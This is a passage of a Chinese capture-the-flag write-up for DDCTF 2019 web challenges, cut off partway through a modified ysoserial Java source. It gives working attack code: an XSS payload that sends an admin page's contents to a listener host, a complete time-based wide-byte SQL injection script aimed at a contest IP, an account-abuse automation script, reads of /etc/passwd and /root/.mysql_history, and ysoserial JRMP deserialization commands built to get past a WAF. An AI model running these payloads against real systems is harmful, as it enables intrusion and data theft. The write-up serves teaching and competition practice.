+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190419014932-52b1bf06-6202-1.png" alt="image.png"></p>
+<p>此时 action使我们可控的，但是由于白名单过滤的存在，我们可控的范围较小。</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190419014933-52d17ca6-6202-1.png" alt="image.png"></p>
+<p>此时，我们可控点为eval前面对的action部分，于是后面的脏字符，我们可以通过#去注释掉。（p.s.用的时候请url编码为%23）</p>
+<p>但是由于白名单限制，我们无法做一些操作。所以只能依靠其本身的作用 – 动态执行函数。</p>
+<p>此时action，即需要执行的函数名，args，执行函数的参数。这两个都在我们可控范围。</p>
+<p>尝试构造如下payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?action:show_flag_function%23;123</span><br></pre></td></tr></table></figure>
+
+<p>此时，成功返回：</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190419014933-52ee491c-6202-1.png" alt="20190413155516526743131.png"></p>
+<p>果然，我是最天真的那个崽。</p>
+<p>但此时也证明了我们思路的可行性，此时我们只需要找一个函数，可以给其传一个参数的那种。进而getflag。</p>
+<p>（p.s. flag函数无参数，所以我们无法直接执行。）</p>
+<p>找啊找啊找朋友，一天过去了，又一天快要过去了… 代码都快会背了….</p>
+<p>最终功夫不负有心人，终于发现一个神奇的地方。</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190419014933-53004d92-6202-1.png" alt="20190413155516540449537.png"></p>
+<p>第144行，trigger_event函数中，他传入了两个功能。然后回想代码，可以发现前面对各个函数执行，是通过execute_event_loop来对队列里的任务进行执行的。trigger_event正是那个添加任务到队列中的函数，此时该函数我们可控。</p>
+<p>再想到之前的条件竞争，我们可以在内部构造一个竞争？对的，可以的，但是此时不配称之为竞争了。</p>
+<p>首先我们看一下我们购买的正常逻辑。</p>
+<p>此时，由于其先进先出的原因，我们可以一开始就传入两个参数，如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?action:trigger_event%23;action:buy;111%23action:get_flag;</span><br></pre></td></tr></table></figure>
+<p>此时传入一个buy和getfalg。我们再看一下逻辑。这样成功实现了，没钱买东西。</p>
+<p>此时，问题来了，即便我们够了5个钻石，此时也获取不到flag。</p>
+<p>因为他将打印flag的语句注释掉了。</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190419014933-5323353c-6202-1.png" alt="2019041315551617756239.png"></p>
+<p>可以看图片155行，此时return的为“天真的孩子”。那这样的话，是不是这题就没法解了？</p>
+<p>肯定能解啊，怎么可能不能解。</p>
+<p>此时仔细看165行，发现了什么？他是将flag作为参数传到show_flag的。别忘了，trigger_event是有log功能的，也就是此时flag会加进log里的。虽然log是在session中，但是，此时flask的特性，我们之前已经说过了。session是在本地的。虽然不能伪造，但是我们还是通过工具解开，查看内容的。</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190419014933-535036fe-6202-1.png" alt="20190413155516616949593.png"></p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190419014934-536aa9bc-6202-1.png" alt="20190413155516621987237.png"></p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190419014934-537ca694-6202-1.png" alt="20190413155516626378085.png"></p>
+<h3 id="200pt-欢迎报名DDCTF"><a href="#200pt-欢迎报名DDCTF" class="headerlink" title="[200pt] 欢迎报名DDCTF"></a>[200pt] 欢迎报名DDCTF</h3><p>emm,感觉这题应该比吃鸡分高的。这道题，感觉比较偏实战渗透。不过作为ctf题目来说，的确有点脑洞了。因为大部分同学没往实战上想。</p>
+<p>首先第一步：XSS</p>
+<p>说实话，一开始拿到这题第一反应是注入。瞎注了半天。最后无疾而终。</p>
+<p>知道hint出来，竟然是我最喜欢的xss，然后就做了。做到后面，已经拿到接口了，也尝试了注入，然而又没卵用。</p>
+<p>第二步：注入</p>
+<p>主办方不放hint是注入的话。这题我就不打算做了。实在get不到点。还是太菜了、</p>
+<p>——以下正文——</p>
+<p>xss读文件，很基础。发现waf了iframe和window。在es6新语法中，很好绕的。</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">s</span>(<span class="params">e</span>) &#123;</span><br><span class="line">  <span class="keyword">var</span> t = <span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>;</span><br><span class="line">  t.<span class="title function_">open</span>(<span class="string">&quot;POST&quot;</span>, <span class="string">&quot;//eval:2017&quot;</span>, !<span class="number">0</span>),</span><br><span class="line">  t.<span class="title function_">setRequestHeader</span>(<span class="string">&quot;Content-type&quot;</span>, <span class="string">&quot;text/plain&quot;</span>),</span><br><span class="line">  t.<span class="property">onreadystatechange</span> = <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="number">4</span> == t.<span class="property">readyState</span> &amp;&amp; t.<span class="property">status</span></span><br><span class="line">  &#125;,</span><br><span class="line">  t.<span class="title function_">send</span>(e);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> a = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&quot;ifr&quot;</span>+<span class="string">&quot;ame&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">a.<span class="property">src</span> = <span class="string">&quot;./admin.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable language_">document</span>.<span class="property">body</span>.<span class="title function_">appendChild</span>(a);</span><br><span class="line">a.<span class="property">onload</span> = <span class="keyword">function</span> (<span class="params"></span>)&#123;</span><br><span class="line">  <span class="keyword">var</span> c = <span class="variable language_">document</span>.<span class="title function_">getElementsByTagName</span>(<span class="string">&quot;ifr&quot;</span>+<span class="string">&quot;ame&quot;</span>)[<span class="number">0</span>][<span class="string">&quot;contentWin&quot;</span>+<span class="string">&quot;dow&quot;</span>].<span class="property">document</span>.<span class="title function_">getElementsByTagName</span>(<span class="string">&quot;body&quot;</span>)[<span class="number">0</span>].<span class="property">innerHTML</span>;</span><br><span class="line">  <span class="title function_">s</span>(<span class="string">&quot;5am3: &quot;</span>+c);</span><br><span class="line">&#125;;</span><br><span class="line">a.<span class="property">onerror</span> = <span class="keyword">function</span> (<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title function_">s</span>(<span class="string">&quot;5am3 error!&quot;</span>);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+
+
+<p>这里还有一个坑点是，渲染payload是在admin.php，此时如果读当前页面源码，返回的是你的payload。必须再次通过iframe读取admin.php，才能获取到本来的源码。</p>
+<p>从源码中，可以得到一个接口：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://117.51.147.2/Ze02pQYLf5gGNyMn/query_aIeMu0FUoVrW0NWPHbN6z4xh.php?id=</span><br></pre></td></tr></table></figure>
+
+<p>这就是传说中的注入点！！！要不是主办方肯定他是，我都不敢信…</p>
+<p>最后终于通过宽字节注入，试出了点眉目。</p>
+<p>p.s.注入过程真心迷，不跑5遍以上脚本，读不出来正确的东西</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://117.51.147.2/Ze02pQYLf5gGNyMn//query_aIeMu0FUoVrW0NWPHbN6z4xh.php?id=&#123;payload&#125;&quot;</span></span><br><span class="line"></span><br><span class="line">sdb =<span class="string">&quot;SELECT database()&quot;</span></span><br><span class="line">sdbt = <span class="string">&quot;database()&quot;</span></span><br><span class="line"></span><br><span class="line">sschema = <span class="string">&quot;SELECT group_concat(schema_name) from information_schema.SCHEMATA&quot;</span></span><br><span class="line">stable = <span class="string">&quot;SELECT group_concat(table_name) from information_schema.tables where table_schema=CHAR(99,116,102,100,98)&quot;</span></span><br><span class="line">scolumn = <span class="string">&quot;SELECT group_concat(column_name) from information_schema.columns where table_name=CHAR(99,116,102,95,102,104,109,72,82,80,76,53)&quot;</span></span><br><span class="line">sflag = <span class="string">&quot;SELECT group_concat(ctf_value) from ctfdb.ctf_fhmHRPL5&quot;</span></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">script = sflag</span><br><span class="line">charIndex = <span class="number">1</span></span><br><span class="line"></span><br><span class="line">p1 = <span class="string">&quot;1%df%27 || if(ascii(substr((&quot;</span>+script+<span class="string">&quot;),&#123;charIndex&#125;,1))=&#123;i&#125;,sleep(100),5)%23&quot;</span></span><br><span class="line">plendatabase = <span class="string">&quot;1%df%27 || if(length(database())=&#123;i&#125;,sleep(100),5)%23&quot;</span></span><br><span class="line">ptest = <span class="string">&quot;1%df%27 || sleep(5)%23&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># len(database) = 3</span></span><br><span class="line"><span class="comment"># database() = say</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># schema = information_schema,ctfdb,say</span></span><br><span class="line"><span class="comment"># table = ctf_fhmHRPL5</span></span><br><span class="line"><span class="comment"># colum = ctf_value</span></span><br><span class="line"><span class="comment"># DDCTF&#123;GqFzOt8PcoksRg66fEe4xVBQZwp3jWJS&#125;</span></span><br><span class="line"></span><br><span class="line">string = <span class="string">&quot;qwertyuiopasdfghjklzxcvbnm&quot;</span></span><br><span class="line">str1=<span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">slist = <span class="built_in">range</span>(<span class="number">33</span>,<span class="number">97</span>)</span><br><span class="line">slist += <span class="built_in">range</span>(<span class="number">123</span>,<span class="number">127</span>)</span><br><span class="line">flag=<span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">onpayload = p1</span><br><span class="line"><span class="comment"># print slist</span></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>,<span class="number">127</span>):</span><br><span class="line">		<span class="keyword">try</span>:</span><br><span class="line">			<span class="comment"># i = str(hex(i))</span></span><br><span class="line">			i = <span class="built_in">str</span>(i)</span><br><span class="line">			payload = onpayload.replace(<span class="string">&quot;&#123;i&#125;&quot;</span>,i).replace(<span class="string">&quot;&#123;charIndex&#125;&quot;</span>,<span class="built_in">str</span>(j))	</span><br><span class="line">			r = requests.get(url+payload,timeout=<span class="number">3</span>)</span><br><span class="line">			text = r.text.replace(<span class="string">&quot;\n&quot;</span>,<span class="string">&quot;&quot;</span>)</span><br><span class="line">			text = text.replace(<span class="string">&quot;\r&quot;</span>,<span class="string">&quot;&quot;</span>)</span><br><span class="line">			text = text.replace(<span class="string">&quot;\t&quot;</span>,<span class="string">&quot;&quot;</span>)</span><br><span class="line">			<span class="comment"># print(&quot;[&quot;+str(i)+&quot;]&quot; + payload)</span></span><br><span class="line">			<span class="comment"># print(&quot;[text] &quot; + text[:10])</span></span><br><span class="line">		<span class="keyword">except</span>:</span><br><span class="line">			flag+=<span class="built_in">chr</span>(<span class="built_in">int</span>(i))</span><br><span class="line">			<span class="built_in">print</span>(flag)</span><br><span class="line">			<span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h3 id="210pt-大吉大利，今晚吃鸡"><a href="#210pt-大吉大利，今晚吃鸡" class="headerlink" title="[210pt] 大吉大利，今晚吃鸡"></a>[210pt] 大吉大利，今晚吃鸡</h3><p>很迷很尬的一道题，最后小手段才做出来。</p>
+<p>首先，很容易可以看出来，是一个go写的。</p>
+<p>而且买票时，票价只可以多 ，不可以少。此时可以猜到是溢出，从而实现购买。</p>
+<p>可以看一下，go中的数字范围。然后天真的从大往小试。最终卡在了以下俩数。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">9223372036854775807   // 可以输入，显示正常</span><br><span class="line">9223372036854775808   // 报500，无法输入</span><br></pre></td></tr></table></figure>
+
+
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190419014934-53a0ab20-6202-1.png" alt="20190413155515397624591.png"></p>
+<p>于是自己天真的认为 ，题目对溢出做了判断，然后就凉了。蜜汁分析了半天。</p>
+<p>最后再注册处发现一个越权漏洞。每次注册，无论成功与否，都会返回注册用户的cookie，此时可以直接登录。</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190419014934-53c23aec-6202-1.png" alt="20190413155515437376035.png"></p>
+<p>于是看了一下榜单，挨个试了一下榜单师傅们的id。</p>
+<p>最后还真找到了rmb122师傅的账号，然后发现他用的4294967296溢出。也就是uint32</p>
+<p>心态炸了。竟然不是uint64，自己也没试uint32。哭了。</p>
+<p>此时通过溢出，可以直接购票。然后我们进入下一关，如何删除竞争对手。一说到游戏，顿时想起了“白导”。我自己也导演一场呗。</p>
+<p>于是，新建账号 -&gt; 买票 -&gt; 付款 -&gt; 加入游戏 -&gt; 获取id踢掉。一条龙服务。脚本如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">tmpID = <span class="string">&quot;1&quot;</span></span><br><span class="line"></span><br><span class="line">tmpSession = requests.session()</span><br><span class="line"></span><br><span class="line">registerURL = <span class="string">&quot;http://117.51.147.155:5050/ctf/api/register?name=5am3_t1&#123;name&#125;&amp;password=12345678aa90&quot;</span></span><br><span class="line">buyTicketURL = <span class="string">&quot;http://117.51.147.155:5050/ctf/api/buy_ticket?ticket_price=4294967296&quot;</span></span><br><span class="line">payTicketURL = <span class="string">&quot;http://117.51.147.155:5050/ctf/api/pay_ticket?bill_id=&#123;bill&#125;&quot;</span></span><br><span class="line">removeRobotsURL = <span class="string">&quot;http://117.51.147.155:5050/ctf/api/remove_robot?id=&#123;uid&#125;&amp;ticket=&#123;ticket&#125;&quot;</span></span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line">	<span class="string">&quot;Cookie&quot;</span>: <span class="string">&quot;REVEL_SESSION=367aac22fa4d096ee5e45e5e214071cf; user_name=5am3&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getTicket</span>(<span class="params">tmpID</span>):</span><br><span class="line">	tmpRegisterURL = registerURL.replace(<span class="string">&quot;&#123;name&#125;&quot;</span>,tmpID)</span><br><span class="line">	tmpSession.get(tmpRegisterURL)</span><br><span class="line"></span><br><span class="line">	billID = tmpSession.get(buyTicketURL).json()[<span class="string">&quot;data&quot;</span>][<span class="number">0</span>][<span class="string">&quot;bill_id&quot;</span>]</span><br><span class="line"></span><br><span class="line">	<span class="comment"># print(billID)</span></span><br><span class="line"></span><br><span class="line">	tmpPayTicketURL = payTicketURL.replace(<span class="string">&quot;&#123;bill&#125;&quot;</span>,billID)</span><br><span class="line">	<span class="comment"># print(tmpPayTicketURL)</span></span><br><span class="line">	ticketJson = tmpSession.get(tmpPayTicketURL).json()</span><br><span class="line">	<span class="comment"># print(ticketJson)</span></span><br><span class="line">	ticket,uid = ticketJson[<span class="string">&quot;data&quot;</span>][<span class="number">0</span>].values()</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> ticket,uid</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">	i = <span class="number">1</span></span><br><span class="line">	c = <span class="number">0</span></span><br><span class="line">	<span class="keyword">while</span>(i&lt;<span class="number">3</span> <span class="keyword">and</span> c &lt; <span class="number">50</span>):</span><br><span class="line">		name = <span class="built_in">str</span>(random.randint(<span class="number">1000</span>, <span class="number">90000</span>))</span><br><span class="line">		c+=<span class="number">1</span></span><br><span class="line">		<span class="keyword">try</span>:</span><br><span class="line">			ticket,uid = getTicket(name)</span><br><span class="line">			<span class="comment"># print(ticket,uid)</span></span><br><span class="line"></span><br><span class="line">			tmpRRURL = removeRobotsURL.replace(<span class="string">&quot;&#123;uid&#125;&quot;</span>,<span class="built_in">str</span>(uid)).replace(<span class="string">&quot;&#123;ticket&#125;&quot;</span>,ticket)</span><br><span class="line">			RRjson = requests.get(tmpRRURL,headers=headers).json()</span><br><span class="line"></span><br><span class="line">			<span class="keyword">if</span>(RRjson[<span class="string">&quot;data&quot;</span>]):</span><br><span class="line">				<span class="built_in">print</span>(<span class="string">&quot;[&quot;</span>+<span class="built_in">str</span>(i)+<span class="string">&quot;] &quot;</span> + <span class="built_in">str</span>(RRjson[<span class="string">&quot;data&quot;</span>]))</span><br><span class="line">				<span class="built_in">print</span>(<span class="string">&quot;&quot;</span>)</span><br><span class="line">				i+=<span class="number">1</span></span><br><span class="line">			time.sleep(<span class="number">1</span>)</span><br><span class="line">			</span><br><span class="line">		<span class="keyword">except</span>:</span><br><span class="line">			<span class="keyword">pass</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190419014934-53d3ce10-6202-1.png" alt="20190413155515676260248.png"></p>
+<h3 id="260pt-mysql弱口令"><a href="#260pt-mysql弱口令" class="headerlink" title="[260pt] mysql弱口令"></a>[260pt] mysql弱口令</h3><p>挺有意思的一道题，最后算是非预期出的吧。预期解实在是想不出来了。</p>
+<p>首先拿到题目，其实就感觉是杭电那题了 <a href="https://www.yuque.com/sourcecode/2019hgame/happygo">wp链接</a></p>
+<p>通过蜜罐sql客户端，来获取连接者的数据。但这题，说实话前期把我玩蒙了。</p>
+<p>题目逻辑，首先下载扫描验证端，放到服务器上，做一下信息收集。然后再服务端填写自己服务器信息，就可以开始弱口令扫描了。</p>
+<p>天真的我以为端口是填agent的端口。酿成一大惨祸。最后才发现，端口是填数据库端口。这样一来，心结解开。终于能拿数据了。</p>
+<p>拿数据的心路历程更加艰难险阻。首先肯定是先读&#x2F;etc&#x2F;passwd。进而直接尝试读&#x2F;flag，发现没有。</p>
+<p>此时，自己意识到了事情的不简单。这是要和flag玩捉迷藏么。</p>
+<p>这是很难受的一件事…</p>
+<p>p.s.心酸历程就不说了。读文件肯定没这么顺利，要都说的话，1万字也收不住。</p>
+<p>按照杭电那次学到的妙招，首先可以先读一下&#x2F;proc&#x2F;self&#x2F;environ,如下图。</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190419014935-54038c18-6202-1.png" alt="image.png"></p>
+<p>此时可以发现两个点，第9行和11行，组合起来&#x2F;home&#x2F;dc2-user&#x2F;ctf_web_2&#x2F;restart.sh。此时读取发现如下信息</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190419014935-5412aa40-6202-1.png" alt="image.png"></p>
+<p>从中，我们可以分析出来，该应用为flask应用，用gunicorn中间件起来的。</p>
+<p>此时根据规则 gunicorn 文件名:项目名。可以推出：</p>
+<blockquote>
+<p>&#x2F;home&#x2F;dc2-user&#x2F;ctf_web_2&#x2F;didi_ctf_web2.py</p>
+</blockquote>
+<p>尝试读取，可以发现：</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190419014935-544327ec-6202-1.png" alt="image.png"></p>
+<p>此时证实了我们的猜想。然后根据flask_script项目的目录结构，进而读取app。</p>
+<p>然后一环接一环，依次读出了下面三个。</p>
+<blockquote>
+<p>&#x2F;home&#x2F;dc2-user&#x2F;ctf_web_2&#x2F;app&#x2F;<strong>init</strong>.py<br>&#x2F;home&#x2F;dc2-user&#x2F;ctf_web_2&#x2F;app&#x2F;main&#x2F;<strong>init</strong>.py<br>&#x2F;home&#x2F;dc2-user&#x2F;ctf_web_2&#x2F;app&#x2F;main&#x2F;views.py</p>
+</blockquote>
+<p>在main&#x2F;views.py中，我们可以看到一个hint。</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190419014935-545ac654-6202-1.png" alt="image.png"></p>
+<p>猜测是通过curl可以从数据库中读到flag…</p>
+<p>奈何自己比较菜，看到数据库遍想起来好像有个文件，是在手动修改数据库时，会留log。</p>
+<p>对，没错，就是.mysql_history。此时尝试用户目录，root目录，最终在root目录读到flag</p>
+<blockquote>
+<p>&#x2F;root&#x2F;.mysql_history</p>
+</blockquote>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190419014936-54b3473e-6202-1.png" alt="image.png"></p>
+<h3 id="390pt-再来1杯Java"><a href="#390pt-再来1杯Java" class="headerlink" title="[390pt] 再来1杯Java"></a>[390pt] 再来1杯Java</h3><p>p.s.压轴题哈，说实话，这题真的学会了不少东西。毕竟自己太菜了，虽然本科专业为java开发狗。但我真的不太熟啊…</p>
+<p>一共分为三关吧。</p>
+<p>首先是一个PadOracle攻击，伪造cookie。这个解密Cookie可以看到hint： PadOracle:iv&#x2F;cbc。</p>
+<p>第二关，读文件，看到后端代码后，才发现，这里贼坑。</p>
+<p>第三关，反序列化。</p>
+<p>首先第一关好说，其实在&#x2F;api&#x2F;account_info这个接口，就可以拿到返回的明文信息。然后通过Padding Oracle + cbc翻转来伪造cookie即可。在这里就不多说了。网上很多资料。</p>
+<p>最后拿到cookie，直接浏览器写入cookie就OK。然后可以获取到一个下载文件的接口。</p>
+<blockquote>
+<p>&#x2F;api&#x2F;fileDownload?fileName&#x3D;1.txt</p>
+</blockquote>
+<p>虽然说是一个任意文件读取的接口，但是贼坑、</p>
+<p>一顿操作猛如虎，最后只读出&#x2F;etc&#x2F;passwd…</p>
+<p>搜到了<a href="https://github.com/tdifg/payloads/blob/master/lfi.txt">很多字典</a>。然后burp爆破一波，最后发现&#x2F;proc&#x2F;self&#x2F;fd&#x2F;15这里有东西，看到熟悉的pk头，情不自禁的笑了起来。（对，就是源码）</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190419014936-54f65eac-6202-1.png" alt="20190419155560741062781.png"></p>
+<p>源码也不多，很容易，可以看到一个反序列化的接口。</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190419014936-5527d2de-6202-1.png" alt="20190418155560268113326.png"></p>
+<p>在反序列化之前，还调用了SerialKiller，作为一个waf，对常见payload进行拦截。</p>
+<p>首先题目给了hint：JRMP。根据这个hint，我们可以找到很多资料。在这里自己用的ysoserial，根据他的JRMP模块来进行下一步操作。</p>
+<p>在这里，JRMP主要起了一个绕过waf的功能，因为这个waf只在反序列化userinfo时进行了调用。当通过JRMP来读取payload进行反序列化时，不会走waf。</p>
+<p>首先，JRMP这个payload被waf掉了，我们可以采用先知上的一种绕过方式。</p>
+<blockquote>
+<p><a href="https://xz.aliyun.com/t/2479">https://xz.aliyun.com/t/2479</a></p>
+</blockquote>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190419014937-5555b226-6202-1.png" alt="20190418155560308363179.png"></p>
+<p>直接修改ysoserial源码即可，将原有的JRMPClient的payload复制一份，改名为JRMPClient2，然后保存并编译。</p>
+<p>此时我们可以尝试使用URLDNS模块，来判断是否攻击成功。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 修改替换&#123;&#123;内容&#125;&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 开启监听端口</span></span><br><span class="line"><span class="comment"># 建议采用ceye的dnslog查看</span></span><br><span class="line">java -<span class="built_in">cp</span> ./ysoserial-5am3.jar ysoserial.exploit.JRMPListener &#123;&#123;port&#125;&#125; URLDNS &#123;&#123;http://eval.com&#125;&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 生成链接JRMPListener的payload</span></span><br><span class="line"><span class="comment"># ip端口那里填写运行第4行脚本的主机地址端口</span></span><br><span class="line">java -jar ./ysoserial-5am3.jar JRMPClient2 &#123;&#123;10.0.0.1:8119&#125;&#125; | <span class="built_in">base64</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 此时将第10行生成的代码，直接打到远程即可。</span></span><br></pre></td></tr></table></figure>
+<p>然后查看dnslog信息。发现存在，那就是ok了。</p>
+<p>接下来可以尝试换payload了。此时这里还存在一个问题。服务器端无法执行命令！！</p>
+<p>这个是hint中给的，所以我们需要找另一种方式，如：代码执行。</p>
+<p>查阅资料，发现ysoserial预留了这块的接口，修改即可。</p>
+<blockquote>
+<p><a href="https://blog.csdn.net/fnmsd/article/details/79534877">https://blog.csdn.net/fnmsd/article/details/79534877</a></p>
+</blockquote>
+<p>然后我们尝试去修改ysoserial&#x2F;payloads&#x2F;util&#x2F;Gadgets.java中createTemplatesImpl方法如下：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// createTemplatesImpl修改版，支持代码执行</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> &lt;T&gt; T <span class="title function_">createTemplatesImpl</span> <span class="params">( <span class="keyword">final</span> String command, Class&lt;T&gt; tplClass, Class&lt;?&gt; abstTranslet, Class&lt;?&gt; transFactory )</span></span><br><span class="line">            <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">final</span> <span class="type">T</span> <span class="variable">templates</span> <span class="operator">=</span> tplClass.newInstance();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// use template gadget class</span></span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> 